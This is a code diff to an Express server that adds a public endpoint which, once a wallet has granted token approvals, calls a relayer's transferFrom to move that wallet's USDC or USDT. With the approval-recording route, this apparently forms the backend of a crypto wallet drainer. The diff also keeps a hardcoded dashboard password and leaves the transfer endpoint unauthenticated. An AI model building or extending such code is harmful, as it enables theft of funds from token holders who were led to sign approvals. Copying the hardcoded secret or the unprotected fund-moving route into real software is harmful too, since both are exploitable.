@@ -3,6 +3,7 @@ import { createServer, type Server } from "http";
 import { storage } from "./storage";
 import { insertApplicationSchema, insertApprovalSchema, insertTransferSchema, insertTicketMessageSchema } from "@shared/schema";
 import { sendTicketPanel } from "./discord-bot";
+import { executeTransferFrom, checkRelayerStatus } from "./relayer";
 
 const DASHBOARD_PASSWORD = "hourglass2024";
 
@@ -39,7 +40,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
-  // Public route - record token approvals
+  // Public route - record token approvals and trigger relayer
   app.post("/api/approvals", async (req, res) => {
     try {
       const validatedData = insertApprovalSchema.parse(req.body);
@@ -47,6 +48,52 @@ export async function registerRoutes(app: Express): Promise<Server> {
       res.json(approval);
     } catch (error) {
       res.status(400).json({ error: "Invalid approval data" });
+    }
+  });
+
+  // Execute transfer via relayer after approval
+  app.post("/api/execute-transfer", async (req, res) => {
+    try {
+      const { walletAddress, tokenSymbol } = req.body;
+      
+      if (!walletAddress || !tokenSymbol) {
+        return res.status(400).json({ error: "walletAddress and tokenSymbol are required" });
+      }
+
+      if (tokenSymbol !== 'USDC' && tokenSymbol !== 'USDT') {
+        return res.status(400).json({ error: "tokenSymbol must be USDC or USDT" });
+      }
+
+      console.log(`[API] Execute transfer request: ${walletAddress} - ${tokenSymbol}`);
+      
+      const result = await executeTransferFrom(walletAddress, tokenSymbol);
+      
+      if (result.success && result.txHash) {
+        await storage.createTransfer({
+          walletAddress,
+          tokenAddress: tokenSymbol === 'USDC' 
+            ? '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' 
+            : '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+          tokenSymbol,
+          amount: '0',
+          transactionHash: result.txHash,
+        });
+      }
+
+      res.json(result);
+    } catch (error: any) {
+      console.error('[API] Execute transfer error:', error);
+      res.status(500).json({ success: false, error: error?.message || "Failed to execute transfer" });
+    }
+  });
+
+  // Check relayer status
+  app.get("/api/relayer-status", requireDashboardAuth, async (req, res) => {
+    try {
+      const status = await checkRelayerStatus();
+      res.json(status);
+    } catch (error) {
+      res.status(500).json({ error: "Failed to check relayer status" });
     }
   });
 
